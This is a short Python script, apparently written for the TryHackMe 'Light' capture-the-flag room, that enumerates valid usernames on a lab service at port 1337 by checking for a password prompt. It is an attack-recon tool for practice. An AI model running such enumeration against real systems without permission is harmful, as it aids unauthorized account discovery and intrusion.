#python script used on TryhackMe room Light: https://tryhackme.com/r/room/lightroom
# script with assistance of Claudi AI
# This script will just find users on usertable and not admintable as to solve the room you nee to use SQLigt injection
# Video walk through for TryHackMe room light is https://www.youtube.com/watch?v=ohvI9lE5hNw&lc=Ugz2E08mSkAM5FCJH9J4AaABAg
# you need to update IP address on the  main function below (line 49)

import socket
import time

def test_username(ip, port, username):
    try:
        # Create a socket connection
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        
        # Receive welcome message
        s.recv(1024)
        
        # Wait for username prompt
        s.recv(1024)
        
        # Send username
        s.send(f"{username}\n".encode())
        
        # Receive response
        response = s.recv(1024).decode()
        
        # Return True if we get a password prompt
        return "Password:" in response
        
    except Exception as e:
        return False
    finally:
        try:
            s.close()
        except:
            pass

def read_usernames(filename):
    try:
        with open(filename, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except Exception:
        print("Error reading file. Please check if the file exists and is readable.")
        return []

def main():
    # Target information
    ip = "10.10.0.251"
    port = 1337
    
    filename = input("Enter username list filename: ")
    usernames = read_usernames(filename)
    
    if not usernames:
        return
    
    print("Starting enumeration...")
    valid_users = []
    
    for username in usernames:
        if test_username(ip, port, username):
            print(f"[+] Valid username found: {username}")
            valid_users.append(username)
        time.sleep(1)
    
    if valid_users:
        print("\nAll valid usernames found:")
        for user in valid_users:
            print(f"- {user}")

if __name__ == "__main__":
    main()
